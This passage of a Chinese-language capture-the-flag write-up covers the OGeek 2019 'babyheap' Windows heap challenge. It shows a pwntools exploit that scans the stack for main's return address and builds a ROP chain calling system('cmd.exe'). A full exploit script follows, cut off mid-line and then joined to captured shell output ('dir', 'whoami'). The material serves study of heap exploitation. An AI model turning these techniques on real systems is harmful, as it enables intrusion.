>
> 这里提一下我犯得一个错误，开始时我尝试将整个栈一次性全部读取下来，但是不仅花的时间长，而且还总是crash，最后我想了一个办法，由于`main_ret_addr`地址是低二位对齐的，所我们只要读取地址低二位为0的地址就可以了，而且一定要从后往前读。
在寻找之前，我们要先把`g_inuse`全部设置为1，以加快查找速度。
    polish(2, 4, p32(g_inuse_addr + 3) + '\n')
    polish(3, 4, p8(1) * 4 + '\n')
    main_ret_content = image_base + 0x193b
    log.success('main_ret_content: ' + hex(main_ret_content))
    # search stack
    log.info('Start searching stack, it will take a long time.')
    main_ret_addr = 0
    for addr in range(StackBase - 0x1000, StackBase, 0x10)[::-1]:
        if(main_ret_addr == 0):
            polish(2, 0x10, p32(addr + 12) + p32(addr + 8) + p32(addr + 4) + p32(addr) + '\n')
            for i in range(3, 3 + 4):
                check(i)
                sh.recvuntil('Show : ')
                result = sh.recvuntil('\r\n', drop=True)[:4]
                content = u32(result.ljust(4, '\0'))
                if(content == main_ret_content):
                    main_ret_addr = addr - (3-(i-3)) * 4
                    break
    log.success('main_ret_addr: ' + hex(main_ret_addr))
由于栈比较大，所以整体读取需要的时间还是比较长的，需要耐心等待，如果超时可以重新试一遍，因为`main_ret_addr`本身就是不固定的，所以读取时间或长或短。
### ROP拿shell
读到`main_ret_addr`之后就是正常的ROP了。
    polish(2, 0x10, p32(main_ret_addr) + 'cmd.exe\0\n')
    layout = [
        ucrtbase_addr + 0x000efd80, # system
        image_base + 0x21AF, # exit
        ptr_addr + 4 * 4,
        0,
    ]
    payload = flat(layout)
    polish(3, len(payload), payload + '\n')
    sh.sendlineafter('choice?\r\n', 5)
    sh.interactive()
### 完整脚本
    #!/usr/bin/python2
    # -*- coding:utf-8 -*-    
    from pwn import *
    # context.log_level = 'debug'
    context.arch = 'i386'
    sh = remote('192.168.3.129', 10001)
    def add(size, content):
        sh.sendlineafter('choice?\r\n', '1')
        sh.sendlineafter('sword?\r\n', str(size))
        sh.sendafter('Name it!\r\n', content)
    def destroy(index):
        sh.sendlineafter('choice?\r\n', '2')
        sh.sendlineafter('destroy?\r\n', str(index))
    def polish(index, size, content):
        sh.sendlineafter('choice?\r\n', '3')
        sh.sendlineafter('polish?\r\n', str(index))
        sh.sendlineafter('time?\r\n', str(size))
        sh.sendafter('again : \r\n', content)
    def check(index):
        sh.sendlineafter('choice?\r\n', '4')
        sh.sendlineafter('check?\r\n', str(index))
    sh.recvuntil('gift : 0x')
    image_base = int(sh.recvuntil('\r\n'), 16) - 0x001090
    log.info('image_base: ' + hex(image_base))
    ptr_addr = image_base + 0x4370
    g_inuse_addr = image_base + 0x0043BC
    for i in range(6):
        add(0x58, '\n')
    destroy(2)
    # leak free heap header
    free_heap_header = ''
    while(len(free_heap_header) $ dir
    dir
     Volume in drive D is data
     Volume Serial Number is 4669-C996
     Directory of D:\ogeek2019\babyheap
    2019-09-10  13:06              .
    2019-09-10  13:06              ..
    2019-07-30  13:59            12,288 babyheap.exe
    2019-09-10  13:06           196,608 babyheap.id0
    2019-09-10  13:06            49,152 babyheap.id1
    2019-09-10  13:06               191 babyheap.id2
    2019-09-08  15:47           264,809 babyheap.idb
    2019-09-10  13:06            16,384 babyheap.nam
    2019-09-10  13:06             2,177 babyheap.til
    2019-07-18  17:49           649,064 kernel32.dll
    2019-09-08  14:45        10,298,900 kernel32.idb
    2019-07-18  17:48         1,191,728 ucrtbase.dll
    2019-06-20  19:00            80,880 vcruntime140.dll
    2019-08-16  15:50            17,662 winver.png
    2019-08-20  21:01            49,152 win_server.exe
                  13 File(s)     12,828,995 bytes
                   2 Dir(s)   9,985,400,832 bytes free
    D:\ogeek2019\babyheap>$ whoami
    whoami
    win10\ex